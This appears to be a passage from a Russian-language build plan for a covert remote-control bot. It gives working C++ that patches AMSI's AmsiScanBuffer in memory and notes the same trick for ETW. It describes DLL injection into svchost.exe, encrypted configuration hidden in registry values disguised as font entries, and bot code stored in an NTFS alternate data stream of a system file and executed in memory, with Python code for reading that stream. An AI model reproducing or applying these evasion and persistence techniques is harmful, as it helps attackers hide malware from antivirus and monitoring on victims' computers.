Задача 3: Обход AMSI и антивирусных хуков

Цель: Предотвратить детекцию PowerShell-команд, скриптов, а также инжекции через AMSI.

Реализация:

· Внедрённая DLL (в svchost.exe) выполняет патчинг AMSI в памяти всех процессов:
  · Находит amsi.dll в загруженных модулях.
  · Получает адрес AmsiScanBuffer.
  · Изменяет первые байты функции на mov eax, 0x80070057 (E_FAIL) или на ret (для полного отключения).
· Для этого используем классическую технику: VirtualProtect + запись байтов.

Фрагмент (C++):

cpp
#include <winternl.h>

void PatchAmsi() {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) return;
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return;
    
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
    // mov eax, 0x80070057; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
}

· Дополнительно: обход ETW (Event Tracing for Windows) для скрытия вызовов. Патчим EtwEventWrite в ntdll.dll аналогичным образом.

Задача 4: Хранение конфигурации и кода (без файлов)

Цель: Исключить запись на диск любых данных, которые могут быть просканированы.

Реализация:

1. Конфигурация (токен бота, ID админов, настройки) — хранится в реестре:
   · Раздел: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts (или любой другой, где обычно хранятся данные, не вызывающие подозрений).
   · Создаётся несколько ключей с именами, похожими на системные шрифты ("Segoe UI (TrueType)" = (бинарные данные)).
   · Данные шифруются AES-256 с ключом, полученным из MachineGuid (читаем из реестра HKLM\SOFTWARE\Microsoft\Cryptography).
2. Основной код бота (Python + библиотеки) — хранится в альтернативных потоках NTFS:
   · Выбирается системный файл, который редко меняется и не удаляется антивирусами, например C:\Windows\System32\spool\drivers\color\RSWOP.icm.
   · В его альтернативный поток (RSWOP.icm:payload) записывается зашифрованный архив с ботом.
   · При запуске бот читает этот поток, расшифровывает и выполняет в памяти (без распаковки на диск).

Функция чтения из NTFS потока (Python):

python
import ctypes
kernel32 = ctypes.windll.kernel32

def read_ntfs_stream(filepath, stream_name):
    full_path = f"{filepath}:{stream_name}"
    handle = kernel32.CreateFileW(full_path, 0x80000000, 3, None, 3, 0, None)
    if handle == -1:
        return None
    size = kernel32.GetFileSize(handle, None)
    buffer = ctypes.create_string_buffer(size)
    bytes_read = ctypes.c_ulong(0)
    kernel32.ReadFile(handle, buffer, size, ctypes.byref(bytes_read), None)
    kernel32.CloseHandle(handle)
    return buffer.raw[:bytes_read.value]
`

1. Временные файлы (скриншоты, логи): не создаём. Всё формируем в памяти (BytesIO) и отправляем, после чего удаляем.
